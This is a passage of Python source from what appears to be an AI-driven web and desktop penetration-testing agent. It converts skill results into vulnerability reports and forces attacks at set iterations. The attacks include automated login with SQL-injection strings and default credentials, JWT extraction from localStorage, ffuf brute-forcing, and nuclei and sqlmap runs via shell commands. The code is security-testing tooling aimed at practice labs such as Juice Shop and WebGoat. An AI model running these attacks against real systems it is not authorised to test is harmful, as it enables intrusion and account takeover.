                                                        summary=callback_summary,
                                                    )
                                                ],
                                            ))
                                        await self._dispatch_report_finding_checked(args)

                                # Auto-report: CSRF findings
                                if _real_skill == "test_csrf" and sr.data:
                                    for finding in (sr.data.get("findings") or [])[:5]:
                                        csrf_component = self.state.target + finding.get("endpoint", "")
                                        csrf_method = finding.get("method", "POST")
                                        csrf_evidence = finding.get("evidence", "")[:1200]
                                        csrf_sev = finding.get("severity", "medium")
                                        args = {
                                            "title": f"CSRF: no protection on {csrf_method} {finding.get('endpoint', '?')}",
                                            "severity": csrf_sev,
                                            "finding_type": "csrf",
                                            "affected_component": csrf_component,
                                            "description": f"No CSRF token on {csrf_method} {finding.get('endpoint', '?')}",
                                            "evidence": csrf_evidence[:500],
                                        }
                                        if csrf_sev in ("high", "critical"):
                                            args.update(self._build_report_finding_args(
                                                title=args["title"],
                                                severity=csrf_sev,
                                                finding_type="csrf",
                                                affected_component=csrf_component,
                                                description=args["description"],
                                                impact="Victims may be forced to execute authenticated state-changing actions from an attacker-controlled origin.",
                                                technical_analysis=f"The CSRF skill observed tokenless or invalid-token acceptance: {csrf_evidence}",
                                                poc_description="Replay the state-changing request with no CSRF token and then with an invalid token; both should be rejected if protection is working.",
                                                poc_script_code=csrf_evidence,
                                                remediation_steps="Require unpredictable CSRF tokens on state-changing requests and pair them with SameSite-aware session handling.",
                                                endpoint=csrf_component,
                                                method=csrf_method,
                                                cwe="CWE-352",
                                            ))
                                        await self._dispatch_report_finding_checked(args)

                                # Auto-report: deep auth findings
                                if _real_skill == "test_auth_deep" and sr.data:
                                    auth_controls = sr.data.get("control_evidence", {}) or {}
                                    for finding in (sr.data.get("findings") or [])[:5]:
                                        auth_sev = finding.get("severity", "high")
                                        auth_type = finding.get("type", "weak_auth")
                                        poc_blob = (
                                            f"Payload: {finding.get('payload', '')}\n"
                                            f"Evidence: {finding.get('evidence', '')}\n"
                                            f"Control: {finding.get('control', {})}\n\n"
                                            f"{finding.get('response_preview', '')[:1200]}"
                                        )
                                        await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                            title=f"{auth_type.replace('_', ' ').title()} on authentication surface",
                                            severity=auth_sev,
                                            finding_type=auth_type,
                                            affected_component=self.state.target,
                                            description=f"Authentication weakness detected: {auth_type}.",
                                            impact="Attackers may forge tokens, fixate sessions, or poison password reset flows to obtain or retain unauthorized access.",
                                            technical_analysis=(
                                                f"The deep-auth skill returned a positive signal for {auth_type}. "
                                                f"Skill-level control evidence: {auth_controls}. Finding-level control: {finding.get('control', {})}."
                                            ),
                                            poc_description="Replay the supplied token/session/reset manipulation and compare the protected endpoint behavior against the normal authenticated baseline.",
                                            poc_script_code=poc_blob,
                                            remediation_steps="Enforce strict JWT verification, rotate sessions on privilege changes/login, and pin reset link generation to trusted host configuration.",
                                            endpoint=self.state.target,
                                            method="GET",
                                        ))

                                # Auto-report: business logic findings
                                if _real_skill == "test_business_logic" and sr.data:
                                    logic_controls = sr.data.get("control_evidence", {}) or {}
                                    for finding in (sr.data.get("findings") or [])[:5]:
                                        logic_sev = finding.get("severity", "high")
                                        logic_type = finding.get("type", "business_logic")
                                        poc_blob = (
                                            f"Payload: {finding.get('payload', '')}\n"
                                            f"Evidence: {finding.get('evidence', '')}\n"
                                            f"Control: {finding.get('control', {})}\n\n"
                                            f"{finding.get('response_preview', '')[:1200]}"
                                        )
                                        await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                            title=f"{logic_type.replace('_', ' ').title()} on business flow",
                                            severity=logic_sev,
                                            finding_type=logic_type,
                                            affected_component=self.state.target,
                                            description=f"Business workflow accepted an invalid or concurrency-sensitive action: {logic_type}.",
                                            impact="Attackers may manipulate state transitions, financial values, or concurrency windows to gain unauthorized business advantage.",
                                            technical_analysis=(
                                                f"The business-logic skill returned accepted vs rejected control data {logic_controls} "
                                                f"and recorded a positive case for {logic_type}: {finding.get('control', {})}."
                                            ),
                                            poc_description="Replay the supplied workflow mutation and compare it against the rejected or normal business control cases recorded by the skill.",
                                            poc_script_code=poc_blob,
                                            remediation_steps="Enforce server-side business invariants, validate state transitions, and serialize concurrency-sensitive mutations.",
                                            endpoint=self.state.target,
                                            method="POST",
                                        ))

                                # Auto-report: Misconfig findings (headers, CORS, debug)
                                if _real_skill == "test_misconfig" and sr.data:
                                    for finding in (sr.data.get("findings") or [])[:5]:
                                        mis_sev = finding.get("severity", "medium")
                                        mis_type = finding.get("type", "misconfiguration")
                                        mis_desc = finding.get("description", finding.get("type", ""))[:200]
                                        mis_evidence = finding.get("evidence", finding.get("payload", ""))[:1200]
                                        args = {
                                            "title": f"Misconfiguration: {mis_type}",
                                            "severity": mis_sev,
                                            "finding_type": "misconfiguration",
                                            "affected_component": self.state.target,
                                            "description": mis_desc,
                                            "evidence": mis_evidence[:500],
                                        }
                                        if mis_sev in ("high", "critical"):
                                            args.update(self._build_report_finding_args(
                                                title=args["title"],
                                                severity=mis_sev,
                                                finding_type="misconfiguration",
                                                affected_component=self.state.target,
                                                description=mis_desc,
                                                impact="Application security posture is weakened by an externally observable misconfiguration that may enable follow-on compromise.",
                                                technical_analysis=f"The misconfiguration skill returned the following evidence: {mis_evidence}",
                                                poc_description="Request the affected resource or replay the header/origin probe and confirm that the unsafe configuration is returned consistently.",
                                                poc_script_code=mis_evidence,
                                                remediation_steps="Harden the affected configuration, remove unnecessary exposure, and add regression checks for the missing control.",
                                                endpoint=self.state.target,
                                                method="GET",
                                            ))
                                        await self._dispatch_report_finding_checked(args)

                                # Auto-report: API security findings
                                if _real_skill == "test_api_security" and sr.data:
                                    for finding in (sr.data.get("findings") or [])[:5]:
                                        api_sev = finding.get("severity", "medium")
                                        api_type = finding.get("type", "api_security")
                                        api_component = self.state.target + finding.get("endpoint", "")
                                        api_desc = finding.get("description", finding.get("payload", ""))[:200]
                                        api_evidence = finding.get("evidence", "")[:1400]
                                        api_payload = finding.get("payload", "")[:300]
                                        args = {
                                            "title": f"API Security: {api_type}",
                                            "severity": api_sev,
                                            "finding_type": api_type,
                                            "affected_component": api_component,
                                            "description": api_desc,
                                            "evidence": api_evidence[:500],
                                        }
                                        if api_sev in ("high", "critical"):
                                            args.update(self._build_report_finding_args(
                                                title=args["title"],
                                                severity=api_sev,
                                                finding_type=api_type,
                                                affected_component=api_component,
                                                description=api_desc,
                                                impact="Attackers may bypass API authorization or mutate protected fields through unsafe action handling.",
                                                technical_analysis=f"The API security skill reported payload={api_payload} with evidence={api_evidence}",
                                                poc_description="Replay the documented API request variant and compare the unauthorized or over-permissive response against the expected access policy.",
                                                poc_script_code=f"Payload: {api_payload}\n\nEvidence: {api_evidence}",
                                                remediation_steps="Enforce server-side authorization and field allowlists for every action-based or object-mutating API path.",
                                                endpoint=api_component,
                                                method="POST",
                                            ))
                                        await self._dispatch_report_finding_checked(args)

                                # Auto-report: Crypto findings
                                if _real_skill == "test_crypto" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        crypto_sev = finding.get("severity", "medium")
                                        crypto_component = self.state.target + finding.get("path", "")
                                        crypto_desc = finding.get("description", finding.get("payload", ""))[:200]
                                        crypto_evidence = finding.get("evidence", "")[:1200]
                                        args = {
                                            "title": f"Crypto weakness: {finding.get('type', 'unknown')}",
                                            "severity": crypto_sev,
                                            "finding_type": "weak_crypto",
                                            "affected_component": crypto_component,
                                            "description": crypto_desc,
                                            "evidence": crypto_evidence[:500],
                                        }
                                        if crypto_sev in ("high", "critical"):
                                            args.update(self._build_report_finding_args(
                                                title=args["title"],
                                                severity=crypto_sev,
                                                finding_type="weak_crypto",
                                                affected_component=crypto_component,
                                                description=crypto_desc,
                                                impact="Weak cryptographic handling may expose secrets, reduce transport security, or enable credential cracking or token compromise.",
                                                technical_analysis=f"The crypto skill reported the following concrete indicator: {crypto_evidence}",
                                                poc_description="Replay the protocol or artifact inspection and confirm that the weak protocol, secret exposure, or weak hash indicator is present.",
                                                poc_script_code=crypto_evidence,
                                                remediation_steps="Disable weak protocols, remove hardcoded secrets, and replace legacy hashes with modern password hashing and secret management.",
                                                endpoint=crypto_component,
                                                method="GET",
                                            ))
                                        await self._dispatch_report_finding_checked(args)

                                # Auto-report: Infra findings (git, env, cloud)
                                if _real_skill == "test_infra" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        infra_component = self.state.target + finding.get("path", "")
                                        infra_desc = finding.get("description", finding.get("payload", ""))[:200]
                                        infra_evidence = finding.get("evidence", "")[:1200]
                                        infra_poc = self._build_simple_http_poc(
                                            url=infra_component,
                                            status=finding.get("status", "?"),
                                            response_preview=finding.get("response_preview", infra_evidence)[:1200],
                                        )
                                        await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                            title=f"Infrastructure exposure: {finding.get('type', 'unknown')}",
                                            severity=finding.get("severity", "high"),
                                            finding_type="misconfiguration",
                                            affected_component=infra_component,
                                            description=infra_desc,
                                            impact="Attackers may leverage exposed infrastructure artifacts to obtain secrets, internal topology, or privileged administrative access.",
                                            technical_analysis=f"The infrastructure skill surfaced the following externally reachable artifact or service evidence: {infra_evidence}",
                                            poc_description="Request the exposed infrastructure path or service directly and verify that the sensitive artifact or administrative surface is reachable.",
                                            poc_script_code=infra_poc,
                                            remediation_steps="Remove public exposure of infrastructure artifacts, restrict administrative services, and block direct access to internal metadata or repository content.",
                                            endpoint=infra_component,
                                            method="GET",
                                        ))

                                # ── Desktop skill auto-promotion ────────────
                                # All 6 macOS desktop skills emit Finding-shaped
                                # dicts with bilingual title|||description and a
                                # DESK-* vector. Web skills above only run on
                                # web targets, so this block fires exclusively
                                # when Brain (or sweep) ran a desktop skill.
                                # Without this, scan_loop would let internal
                                # findings die in sr.data and the report would
                                # come back empty even when the skill clearly
                                # found something on disk.
                                if _real_skill in (
                                    "test_local_storage_secrets",
                                    "test_electron_misconfig",
                                    "test_signature_audit",
                                    "test_entitlement_audit",
                                    "test_dylib_hijack",
                                    "test_deeplink_abuse",
                                ) and sr.data:
                                    _root = sr.data.get("root") or self.state.target
                                    for finding in (sr.data.get("findings") or []):
                                        # Each desktop skill picks its own
                                        # location field; coalesce them so
                                        # affected_component is always populated.
                                        _loc = (
                                            finding.get("abs_path")
                                            or finding.get("path")
                                            or finding.get("binary")
                                            or _root
                                        )
                                        # Phase Q2: dedup discriminator. Without
                                        # it, 12 dylib_hijack findings all share
                                        # the binary path → finding_tools dedupes
                                        # them to a single VXIS-NNNN entry. Each
                                        # finding type carries its own
                                        # distinguishing key (dylib name,
                                        # entitlement, scheme, flag) — append it
                                        # to affected_component as a fragment so
                                        # the binary stays the same but each
                                        # specific issue gets its own slot.
                                        _disc = (
                                            finding.get("dylib")
                                            or finding.get("entitlement_key")
                                            or finding.get("entitlement")
                                            or finding.get("scheme")
                                            or finding.get("flag")
                                            or finding.get("secret_type")
                                            or finding.get("vector")
                                        )
                                        if _disc and "#" not in _loc:
                                            _loc_with_disc = f"{_loc}#{_disc}"
                                        else:
                                            _loc_with_disc = _loc
                                        # Evidence: prefer the skill's snippet
                                        # if present (LSS gives masked context),
                                        # else fall back to a compact summary
                                        # of the matched bytes for the verifier
                                        # to chew on.
                                        _ev = (
                                            finding.get("snippet")
                                            or finding.get("evidence")
                                            or (
                                                f"vector={finding.get('vector', '?')} "
                                                f"flag={finding.get('flag', finding.get('entitlement_key', finding.get('scheme', '?')))} "
                                                f"path={_loc}"
                                            )
                                        )
                                        await self._dispatch_report_finding_checked({
                                            "title": finding.get("title", f"Desktop finding: {finding.get('vector', '?')}"),
                                            "severity": finding.get("severity", "medium"),
                                            "finding_type": finding.get("vector", "desktop_misconfiguration"),
                                            "affected_component": _loc_with_disc,
                                            "description": finding.get("description", "")[:1500],
                                            "evidence": str(_ev)[:500],
                                        })

                        except Exception:
                            logger.exception("skill %s failed", skill_name)

            # ── Phase C auto-orchestration ──────────────────────────────
            # Code enforcement: if Brain hasn't done key actions by certain
            # iteration thresholds, do them automatically and inject results.

            # Auto-browser-login: at iter 8, if no login was attempted yet,
            # auto-navigate to login page + try default creds + SQLi.
            # Triggers regardless of whether Brain used browser — Brain
            # uses it but never tries fill_form. Code enforces the action.
            if (
                not _auto_login_done
                and self.state.iteration >= 8
                and "browser_navigate" in self.registry.list_tools()
            ):
                _auto_browser_done = True
                try:
                    self._emit_brain_status(
                        f"iter {self.state.iteration}/{self.state.max_iters} - "
                        "Auto browser recon: detecting login surface",
                        vector_id="auto:browser-recon",
                    )
                    nav_result = await self.registry.dispatch(
                        "browser_navigate", {"url": self.state.target}
                    )
                    if nav_result.ok:
                        self.state.add_message("tool", {
                            "name": "browser_navigate",
                            "args": {"url": self.state.target},
                            "result": {"ok": True, "summary": nav_result.summary, "data": nav_result.data},
                        })
                        # Check for login-like inputs
                        inputs = nav_result.data.get("inputs", []) if nav_result.data else []
                        has_password = any(i.get("type") == "password" for i in inputs)
                        # Track the URL where the login form was discovered so
                        # we can navigate back to it for each credential attempt.
                        _login_url_found = self.state.target if has_password else None
                        if not has_password:
                            # Try navigating to common login paths. WebGoat uses
                            # /login (no hash), Juice Shop uses /#/login, etc.
                            for login_path in [
                                "/#/login", "/login", "/auth/login",
                                "/signin", "/users/sign_in", "/user/login",
                                "/WebGoat/login", "/admin/login",
                            ]:
                                login_url = self.state.target.rstrip("/") + login_path
                                lr = await self.registry.dispatch("browser_navigate", {"url": login_url})
                                if lr.ok:
                                    lr_inputs = lr.data.get("inputs", []) if lr.data else []
                                    has_password = any(i.get("type") == "password" for i in lr_inputs)
                                    if has_password:
                                        inputs = lr_inputs
                                        _login_url_found = login_url
                                        self.state.add_message("tool", {
                                            "name": "browser_navigate",
                                            "args": {"url": login_url},
                                            "result": {"ok": True, "summary": lr.summary, "data": lr.data},
                                        })
                                        break

                        # DOM analysis
                        dom_result = await self.registry.dispatch("browser_analyze_dom", {})
                        if dom_result.ok:
                            self.state.add_message("tool", {
                                "name": "browser_analyze_dom", "args": {},
                                "result": {"ok": True, "summary": dom_result.summary, "data": dom_result.data},
                            })

                        # Auto-login: adaptive selector detection. We don't
                        # hardcode #email/#loginButton — that only works on
                        # Juice Shop. Instead, we inspect the discovered form
                        # inputs and derive selectors by name/id/type. This
                        # works against WebGoat (username/password), DVWA,
                        # generic Spring/Rails/Django forms, etc.
                        if has_password and not _auto_login_done:
                            _auto_login_done = True
                            try:
                                from vxis.agent.tools.browser_tools import _page as _bp
                                if _bp is not None:
                                    # Dismiss common overlays
                                    for dismiss_sel in [
                                        "a.cc-dismiss", "button.cc-dismiss",
                                        "button[aria-label='Close Welcome Banner']",
                                        "button.close", ".modal .close",
                                        "[aria-label*='dismiss' i]", "[aria-label*='close' i]",
                                    ]:
                                        try:
                                            await _bp.click(dismiss_sel, timeout=2000)
                                        except Exception:
                                            pass

                                    # Derive user + password + submit selectors
                                    def _sel(ident: str | None, elem_type: str | None) -> str | None:
                                        if ident:
                                            return f"#{ident}" if not ident.startswith("#") else ident
                                        if elem_type:
                                            return f"input[type='{elem_type}']"
                                        return None

                                    _user_input = None
                                    _pw_input = None
                                    for i in inputs:
                                        itype = str(i.get("type", "")).lower()
                                        iname = str(i.get("name", "")).lower()
                                        iid = str(i.get("id", "")).lower()
                                        if itype == "password" and _pw_input is None:
                                            _pw_input = i
                                        elif (
                                            _user_input is None
                                            and itype in ("text", "email", "tel", "", "search")
                                            and any(
                                                k in iname or k in iid
                                                for k in ("email", "user", "login", "account", "name")
                                            )
                                        ):
                                            _user_input = i
                                    # Fallback: first non-password text-ish input
                                    if _user_input is None:
                                        for i in inputs:
                                            itype = str(i.get("type", "")).lower()
                                            if itype != "password" and itype in ("text", "email", "tel", "", "search"):
                                                _user_input = i
                                                break

                                    # Build selector chains with fallbacks
                                    _user_sels: list[str] = []
                                    if _user_input:
                                        _uid = _user_input.get("id") or ""
                                        _unm = _user_input.get("name") or ""
                                        if _uid:
                                            _user_sels.append(f"#{_uid}")
                                        if _unm:
                                            _user_sels.append(f"input[name='{_unm}']")
                                    # Generic fallbacks
                                    _user_sels.extend([
                                        "input[type='email']",
                                        "input[name='username']", "input[name='email']",
                                        "input[name='user']", "input[name='login']",
                                        "#username", "#email", "#user", "#login",
                                        "input[type='text']:not([type='password'])",
                                    ])
                                    _pw_sels: list[str] = []
                                    if _pw_input:
                                        _pid = _pw_input.get("id") or ""
                                        _pnm = _pw_input.get("name") or ""
                                        if _pid:
                                            _pw_sels.append(f"#{_pid}")
                                        if _pnm:
                                            _pw_sels.append(f"input[name='{_pnm}']")
                                    _pw_sels.extend([
                                        "input[type='password']", "#password", "#pass",
                                    ])
                                    _submit_sels = [
                                        "button[type='submit']", "input[type='submit']",
                                        "#loginButton", "#login-button", "button.login",
                                        "button[name='login']", "button:has-text('Sign in')",
                                        "button:has-text('Log in')", "button:has-text('Login')",
                                    ]

                                    # Target-agnostic credential matrix. The SQLi
                                    # attempt goes first because it's the only
                                    # payload that directly produces a CRITICAL
                                    # finding when it succeeds.
                                    _login_creds = [
                                        ("' OR 1=1--", "x"),
                                        ("admin' --", "x"),
                                        ("admin@juice-sh.op", "admin123"),
                                        ("admin", "admin"),
                                        ("admin", "password"),
                                        ("guest", "guest"),   # WebGoat default
                                        ("user", "user"),
                                        ("webgoat", "webgoat"),
                                        ("test", "test"),
                                    ]

                                    _login_target = _login_url_found or self.state.target

                                    # Log what we actually discovered so future
                                    # scans aren't a black box on failure.
                                    logger.info(
                                        "auto-login: %d inputs on %s — user_sels=%s pw_sels=%s",
                                        len(inputs), _login_target,
                                        _user_sels[:3], _pw_sels[:3],
                                    )

                                    async def _fill_any(sels: list[str], value: str) -> str | None:
                                        """Return the selector that worked, or None.
                                        BrowserPage.fill(selector, value) has NO timeout kwarg — passing
                                        one raises TypeError which previously was swallowed silently,
                                        making every auto-login attempt fail. Fixed: use the real signature
                                        and fall back to the underlying Playwright page for selector
                                        types BrowserPage doesn't handle (e.g. :has-text).
                                        """
                                        for s in sels:
                                            try:
                                                await _bp.fill(s, value)
                                                return s
                                            except Exception:
                                                # Try raw Playwright as fallback — some selectors
                                                # (e.g. with 'i' case flag) need the real page.
                                                try:
                                                    await _bp._page.fill(s, value, timeout=2500)
                                                    return s
                                                except Exception:
                                                    continue
                                        return None

                                    async def _click_any(sels: list[str]) -> str | None:
                                        for s in sels:
                                            try:
                                                await _bp.click(s, timeout=3000)
                                                return s
                                            except Exception:
                                                try:
                                                    await _bp._page.click(s, timeout=2500)
                                                    return s
                                                except Exception:
                                                    continue
                                        return None

                                    _login_failures: list[str] = []
                                    _login_success = False
                                    _login_nav_timeout_ms = 12_000
                                    for idx, (email, pwd) in enumerate(_login_creds, start=1):
                                        try:
                                            self._emit_brain_status(
                                                f"iter {self.state.iteration}/{self.state.max_iters} - "
                                                f"Auto-login attempt {idx}/{len(_login_creds)} on discovered login form",
                                                vector_id="auto:login",
                                            )
                                            self._emit_event(
                                                "attack",
                                                {
                                                    "vector_id": "auto:login",
                                                    "method": "BROWSER",
                                                    "endpoint": (
                                                        f"{self._truncate_ui_text(_login_target, 64)} "
                                                        f"[{idx}/{len(_login_creds)}]"
                                                    ),
                                                },
                                            )
                                            logger.info(
                                                "auto-login attempt %d/%d on %s with user=%s",
                                                idx,
                                                len(_login_creds),
                                                _login_target,
                                                email[:40],
                                            )
                                            await _bp.navigate(
                                                _login_target,
                                                timeout=_login_nav_timeout_ms,
                                            )
                                            import asyncio as _aio
                                            # WebGoat / Spring Security often re-render
                                            # the form; give the DOM a moment to settle.
                                            await _aio.sleep(0.7)
                                            _user_sel = await _fill_any(_user_sels, email)
                                            if _user_sel is None:
                                                logger.debug("auto-login: user field not found for %s", email)
                                                _login_failures.append(f"{email}:no_user_field")
                                                continue
                                            _pw_sel = await _fill_any(_pw_sels, pwd)
                                            if _pw_sel is None:
                                                logger.debug("auto-login: pw field not found")
                                                _login_failures.append(f"{email}:no_pw_field")
                                                continue
                                            # Try submit via button, else press Enter on password.
                                            # BrowserPage.press(key) takes ONLY a key — to send Enter
                                            # to a specific field we must hit the underlying page.
                                            if await _click_any(_submit_sels) is None:
                                                try:
                                                    await _bp._page.press(_pw_sel, "Enter")
                                                except Exception:
                                                    pass
                                            await _aio.sleep(2)
                                            snap = await _bp.snapshot()

                                            # Check for session token
                                            token_cookies = [c for c in snap.cookies if "token" in c.get("name", "").lower()]
                                            if token_cookies:
                                                # Extract JWT payload
                                                jwt_payload = ""
                                                try:
                                                    jwt_data = await _bp.evaluate(
                                                        "try { JSON.parse(atob(localStorage.getItem('token').split('.')[1])) } catch(e) { null }"
                                                    )
                                                    if jwt_data:
                                                        import json as _jm
                                                        jwt_payload = _jm.dumps(jwt_data, default=str)[:500]
                                                except Exception:
                                                    pass

                                                finding_msg = (
                                                    f"AUTO-EXPLOIT: Login succeeded with credentials "
                                                    f"email='{email}' password='{pwd}'!\n"
                                                    f"Session cookies: {[c.get('name') for c in token_cookies]}\n"
                                                )
                                                if jwt_payload:
                                                    finding_msg += f"JWT payload: {jwt_payload}\n"
                                                if "OR 1=1" in email:
                                                    finding_msg += (
                                                        "\nThis is SQL INJECTION authentication bypass — "
                                                        "CRITICAL severity. The login form is injectable.\n"
                                                    )
                                                self.state.add_message("user", finding_msg)
                                                logger.info("auto-login SUCCESS: %s → token found, JWT=%s",
                                                           email, jwt_payload[:100])

                                                # Auto-report this finding
                                                evidence = (
                                                    f"Login with email='{email}' password='{pwd}' "
                                                    f"resulted in authenticated session.\n"
                                                    f"Cookies: {snap.cookies}\n"
                                                    f"JWT: {jwt_payload}\n"
                                                    f"Redirected to: {snap.url}"
                                                )
                                                severity = "critical" if "OR 1=1" in email else "high"
                                                ftype = "sql_injection" if "OR 1=1" in email else "weak_auth"
                                                await self._dispatch_report_finding_checked({
                                                    "title": f"Authentication bypass via {'SQLi' if 'OR 1=1' in email else 'default credentials'} on login form",
                                                    "severity": severity,
                                                    "finding_type": ftype,
                                                    "affected_component": _login_target,
                                                    "description": finding_msg,
                                                    "evidence": evidence,
                                                })
                                                self.state.record_attempt_outcome(
                                                    "web:auth-bypass",
                                                    "auto-login",
                                                    {"target": _login_target, "email": email},
                                                    status="found",
                                                    summary="auto-login obtained authenticated session",
                                                )
                                                if "OR 1=1" in email:
                                                    self.state.record_attempt_outcome(
                                                        "web:sqli",
                                                        "auto-login",
                                                        {"target": _login_target, "email": email},
                                                        status="found",
                                                        summary="SQLi login bypass obtained authenticated session",
                                                    )
                                                _login_success = True
                                                break
                                            else:
                                                # No token cookie — credential combo didn't authenticate.
                                                _login_failures.append(f"{email}:no_session_cookie")
                                        except Exception as _le:
                                            logger.debug("auto-login attempt %s failed: %s", email, _le)
                                            _login_failures.append(f"{email}:exception_{type(_le).__name__}")

                                    # If every credential failed, tell Brain explicitly so it
                                    # pivots instead of letting the attempt fail silently.
                                    # Without this message, Brain would have no signal that
                                    # auto-login was even tried, let alone that it exhausted
                                    # 9 credential combos.
                                    if not _login_success:
                                        _fail_summary = (
                                            f"AUTO-LOGIN EXHAUSTED: tried {len(_login_creds)} credential "
                                            f"combos against {_login_target}, NONE succeeded. "
                                            f"Reasons (first 5): {_login_failures[:5]}. "
                                            f"PIVOT NOW — do not retry auto-login. Options: "
                                            f"(a) run_skill test_auth_deep (JWT alg:none, RS256→HS256, session fixation) "
                                            f"(b) run_skill test_injection on the login URL with param=email/username "
                                            f"(c) run_skill enumerate_endpoints + attack non-auth surface "
                                            f"(d) if target has a registration page, register a real account first. "
                                            f"Discovered form inputs: user_sels={_user_sels[:3]}, pw_sels={_pw_sels[:3]}."
                                        )
                                        self.state.add_message("user", _fail_summary)
                                        self.state.record_attempt_outcome(
                                            "web:auth-bypass",
                                            "auto-login",
                                            {"target": _login_target, "attempts": len(_login_creds)},
                                            status="clean",
                                            summary=_fail_summary,
                                        )
                                        logger.warning(
                                            "auto-login exhausted after %d creds on %s — telling Brain to pivot",
                                            len(_login_creds), _login_target,
                                        )
                            except Exception:
                                logger.exception("auto-login failed")
                        logger.info("auto-browser-recon completed at iter %d", self.state.iteration)
                except Exception:
                    logger.exception("auto-browser-recon failed")

            # Auto-ffuf: directory bruteforce at iter 10
            if (
                not getattr(self, '_auto_ffuf_done', False)
                and self.state.iteration >= 10
                and "shell_exec" in self.registry.list_tools()
            ):
                ffuf_ran = any(
                    m.get("role") == "tool"
                    and isinstance(m.get("content"), dict)
                    and m["content"].get("name") == "shell_exec"
                    and "ffuf" in str(m["content"].get("args", ""))
                    for m in self.state.messages
                )
                if not ffuf_ran:
                    self._auto_ffuf_done = True
                    try:
                        # Get baseline size for SPA filtering
                        bs_filter = ""
                        if _baseline_size is not None:
                            bs_filter = f"-fs {_baseline_size} "
                        ffuf_cmd = (
                            f"ffuf -u {self.state.target}/FUZZ "
                            f"-w /usr/share/dirb/wordlists/common.txt "
                            f"{bs_filter}"
                            f"-mc 200,301,302,403 "
                            f"-t 20 -timeout 5 -s 2>&1 | head -30"
                        )
                        logger.info("auto-ffuf starting at iter %d", self.state.iteration)
                        fr = await self.registry.dispatch("shell_exec", {
                            "command": ffuf_cmd, "timeout": 60,
                        })
                        _sandbox_invocations.append({"tool": "shell_exec", "cmd": ffuf_cmd})
                        self.state.record_attempt_outcome(
                            "web:dir-bruteforce",
                            "shell_exec",
                            {"command": ffuf_cmd},
                            status=self._status_from_tool_result(fr),
                            summary=fr.summary,
                        )
                        if fr.ok:
                            stdout = str(fr.data.get("stdout", "")) if fr.data else ""
                            if stdout.strip():
                                self.state.add_message("tool", {
                                    "name": "shell_exec",
                                    "args": {"command": "ffuf directory scan"},
                                    "result": {"ok": True, "summary": fr.summary, "data": fr.data},
                                })
                                self.state.add_message("user", (
                                    "AUTO-RECON: ffuf found these paths:\n"
                                    + stdout[:1500] + "\n\n"
                                    "Navigate to each path with browser_navigate or "
                                    "http_request and assess for vulnerabilities."
                                ))
                            logger.info("auto-ffuf completed at iter %d (%d bytes)",
                                       self.state.iteration, len(stdout))
                    except Exception:
                        logger.exception("auto-ffuf failed")

            # Auto-nuclei: if Brain hasn't run nuclei by iter 12, fire it
            if (
                not _auto_nuclei_done
                and self.state.iteration >= 12
                and "shell_exec" in self.registry.list_tools()
            ):
                # Check if Brain or auto already ran nuclei — look for
                # actual shell_exec tool calls with "nuclei" in args only
                nuclei_ran = any(
                    m.get("role") == "tool"
                    and isinstance(m.get("content"), dict)
                    and m["content"].get("name") == "shell_exec"
                    and "nuclei" in str(m["content"].get("args", ""))
                    for m in self.state.messages
                )
                if not nuclei_ran:
                    _auto_nuclei_done = True
                    logger.info("auto-nuclei: firing at iter %d", self.state.iteration)
                    try:
                        nuclei_cmd = (
                            f"nuclei -u {self.state.target} "
                            "-t /root/nuclei-templates/http/exposures/ "
                            "-t /root/nuclei-templates/http/default-logins/ "
                            "-t /root/nuclei-templates/http/exposed-panels/ "
                            "-t /root/nuclei-templates/http/cves/ "
                            "-t /root/nuclei-templates/http/misconfiguration/ "
                            "-severity critical,high,medium "
                            "-silent -nc -timeout 5 -retries 1 "
                            "-rate-limit 100"
                        )
                        nr = await self.registry.dispatch("shell_exec", {
                            "command": nuclei_cmd, "timeout": 120,
                        })
                        _sandbox_invocations.append({"tool": "shell_exec", "cmd": nuclei_cmd})
                        self.state.record_attempt_outcome(
                            "web:cve-scan",
                            "shell_exec",
                            {"command": nuclei_cmd},
                            status=self._status_from_tool_result(nr),
                            summary=nr.summary,
                        )
                        if nr.ok:
                            self.state.add_message("tool", {
                                "name": "shell_exec",
                                "args": {"command": "nuclei scan"},
                                "result": {"ok": True, "summary": nr.summary, "data": nr.data},
                            })
                            stdout = ""
                            if isinstance(nr.data, dict):
                                stdout = str(nr.data.get("stdout", ""))
                            if stdout.strip():
                                self.state.add_message("user", (
                                    "AUTO-RECON: nuclei found results! Analyze each line "
                                    "and report_finding for confirmed vulnerabilities:\n"
                                    + stdout[:2000]
                                ))
                            logger.info("auto-nuclei completed at iter %d (%d bytes output)",
                                       self.state.iteration, len(stdout))
                    except Exception:
                        logger.exception("auto-nuclei failed")

            # Auto-sqlmap: at iter 18+, if findings exist with 500 errors
            # and Brain hasn't run sqlmap, auto-fire on the best target
            if (
                not getattr(self, '_auto_sqlmap_done', False)
                and self.state.iteration >= 18
                and "shell_exec" in self.registry.list_tools()
            ):
                try:
                    from vxis.agent.tools.finding_tools import _get_findings
                    current_findings = _get_findings()
                except Exception:
                    current_findings = []

                # Find endpoints with error responses (500s = likely injectable)
                sqlmap_targets = []
                for f in current_findings:
                    comp = f.get("affected_component", "")
                    title = f.get("title", "")
                    if ("500" in title or "error" in f.get("finding_type", "")) and comp.startswith("http"):
                        sqlmap_targets.append(comp)

                sqlmap_ran = any(
                    m.get("role") == "tool"
                    and isinstance(m.get("content"), dict)
                    and m["content"].get("name") == "shell_exec"
                    and "sqlmap" in str(m["content"].get("args", ""))
                    for m in self.state.messages
                )

                if sqlmap_targets and not sqlmap_ran:
                    self._auto_sqlmap_done = True
                    target_url = sqlmap_targets[0]
                    # Add query param if none exists (sqlmap needs injectable param)
                    if "?" not in target_url:
                        target_url += "?q=test"
                    try:
                        sqlmap_cmd = (
                            f"sqlmap -u '{target_url}' "
                            "--batch --level=2 --risk=2 "
                            "--threads=4 --timeout=10 "
                            "--output-dir=/tmp/sqlmap_auto "
                            "2>&1 | tail -50"
                        )
                        logger.info("auto-sqlmap firing on %s", target_url)
                        sr = await self.registry.dispatch("shell_exec", {
                            "command": sqlmap_cmd, "timeout": 180,
                        })
                        _sandbox_invocations.append({"tool": "shell_exec", "cmd": sqlmap_cmd})
                        self.state.record_attempt_outcome(
                            "web:sqli",
                            "shell_exec",
                            {"command": sqlmap_cmd},
                            status=self._status_from_tool_result(sr),
                            summary=sr.summary,
                        )
                        if sr.ok:
                            stdout = str(sr.data.get("stdout", "")) if sr.data else ""
                            self.state.add_message("tool", {
